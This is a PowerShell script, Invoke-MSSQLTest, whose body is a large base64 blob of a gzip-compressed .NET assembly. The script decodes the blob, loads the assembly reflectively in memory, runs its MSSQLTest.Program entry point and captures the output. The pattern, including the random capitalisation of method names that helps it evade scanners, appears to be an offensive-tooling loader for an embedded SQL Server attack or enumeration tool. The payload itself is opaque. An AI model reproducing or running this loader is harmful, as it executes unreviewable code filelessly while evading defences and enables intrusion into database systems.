function Invoke-MSSQLTest
{

    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))

    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [MSSQLTest.Program]::Main("")

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}